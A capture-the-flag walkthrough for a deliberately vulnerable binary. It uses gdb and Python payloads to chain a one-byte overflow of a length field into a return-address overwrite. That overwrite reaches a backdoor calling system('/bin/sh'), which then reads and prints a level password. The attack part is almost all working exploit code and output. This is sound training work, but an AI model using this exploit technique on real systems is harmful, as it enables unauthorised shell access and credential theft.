# level08

Nothing of note with `ll`.
`checksec` tells us that the `Partial RELRO`, `NX enabled` and `PIE enabled` protections are present.
`Partial RELRO` does not prevent a **PLT** overwrite.
`NX enabled`, or **N**o e**X**ecution indicates that it is not possible to execute code from the stack.
`PIE enabled` as tasty as this sounds, **Position Independant Executable** means the binary doesn’t run at a fixed memory address.
At each execution the base address is defined and all function addresses will have this offset.
So `printf address == base address + offset`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|fgets|main|
|printf|handle_msg|
|puts|save|
|stdin|secret_backdoor|
|strncpy|set_msg|
|system|set_username|

Keen eyes will have spotted the `secret_backdoor()` function.
If we manage to reach it, we will be able to inject any command we want as an argument of `system()`.

We can see a structure named `msg_t`, it contains a **char message[140]**, a **char username[40]** and a an **int length**.

`set_username()` copies **41 bytes** of the `user's stdin input` into **message.username**.

Since **message.username** is **40 bytes** the last one overflows into **message.length**.

In `set_msg()` **message.length** bytes of the `user's stdin input` into **message.message**, this can be used to overwrite `handle_msg()`'s return address since `msg_t message` is stored there.

(See NOTE at the end of the walkthrough for a more in-depth explanation).

First we need to find `secret_backdoor()`'s return address like so
```sh
gdb ./level09
(gdb) start
[...]
Temporary breakpoint 1, 0x0000555555554aac in main ()
(gdb) x/i secret_backdoor 
   0x55555555488c <secret_backdoor>:	push   %rbp

# We can also find handle_msg()'s return address like so
(gdb) b handle_msg
(gdb) c
(gdb) info frame
Stack level 0, frame at 0x7fffffffe5e0:
 rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
```

So `secret_backdoor()`'s address is `0x55555555488c`, we will need to overwrite `hande_msg()`'s return address (`saved rip 0x555555554abd`) with it. Therefore, we will only need to overwrite the last two bytes.


So, we need **message.username** to be
|padding|desired length as hexadecimal number|
|-|-|
|`a * 40`|`\xFF`|

This will cause a **message.message** to overflow. Now we need to find the offset needed to reach `handle_msg()`'s return address. We will use our **pattern** from the **pattern generator**.

```sh
# This is a gdb run file, it contains commands to execute on startup
echo -e "run < /tmp/out\nquit" > /tmp/g

python -c "print('a' * 40 + '\xFF'); print('b');" > /tmp/out && gdb -q -x /tmp/g ./level09

[...]
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
A debugging session is active.

# If we copy 255 bytes, the return address gets completely overwritten.
# We know that our offset is at least 188 bytes (140 + 40 + 8), in hexadecimal this gives 0xBC. Let's try with 0xCC (204)
python -c "print('a' * 40 + '\xCC'); print('b');" > /tmp/out && gdb -q -x /tmp/g ./level09

[...]
Program received signal SIGSEGV, Segmentation fault.
0x0000555500000000 in ?? ()
A debugging session is active.

# The segfault shows the beginning of the return address. We can see that 4 bytes are missing, therefore, our offset must be 0xCC - 0x04 == 0xC8 == 200
# So we need to overwrite the 2 bytes after the first 200 to change the return address, let us test that theory (202 == 0xCA)
python -c "print('a' * 40 + '\xCA'); print('b');" > /tmp/out && gdb -q -x /tmp/g ./level09

[...]
Program received signal SIGSEGV, Segmentation fault.
0x0000555555550000 in ?? ()
A debugging session is active.

# We were right, we will need to copy 202 bytes to overwrite the address
```

Then our payloads would look like this
username:
|padding|desired copy length|
|-|-|
|**40 bytes**|`0xCA`|

message:
|padding|`system()`'s address|
|-|-|
|**200 bytes**|`\x8c\x48`|

Let us do this
```sh
python -c "print('a' * 40 + '\xCA'); print('b' * 200 + '\x8c\x48');" > /tmp/out && gdb -x /tmp/g ./level09
[...]
sh: 1: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb: not found

# So we managed to trigger the system() function call with our second print's padding. We just need to find where system() starts interpreting the padding as a command. To do this we will use our trusty pattern one last time
python -c "print('a' * 40 + '\xCA'); print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag' + '\x8c\x48');" > /tmp/out && gdb ./level09
[...]
sh: 1: Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5AgAg4Ag5Ag: not found

# We can see that it starts at 'Ac4A', if we search in our pattern we can see that represents an offset of 72 bytes.
```

Now we can make our real message payload
|command padding|command|address padding|`system()`'s address|
|-|-|-|-|
|**72 bytes**|`/bin/sh`|**200 bytes**|`\x8c\x48`|

Putting all this together gives us this (I added the cat command to keep the shell open).
```sh
(cat <(python -c "print('a' * 40 + '\xCa'); print('b'*72 + '/bin/sh;' + 'c' * 120 + '\x8c\x48');") -) | ./level09
[...] # This segfaults after the first command so we need to open it again to get the password
whoami
end
[...]
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

```sh
su end
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
cat end
GG !
```

Well this is the end innit'?

Fun fact, contrary to french, in english there is no space character before punctuation marks such as `!` or `?`.
The message above must have been written by a Frenchman!

NOTE:

So basically `handle_msg()`'s stack looks like this.
```
Higher addresses
+-----[handle_msg]-----+
| return address       |
| saved rbp            |
| ...                  |
| msg.length           |
| msg.username         |
| msg.message          |
+----------------------+
Lower addresses
```

First, what happens is **username** overwrites **1 byte** of **length** and then **message** overwrites both of those up until `return address` using **length**'s corrupted value.

You can ask Alec to draw you an explanation.
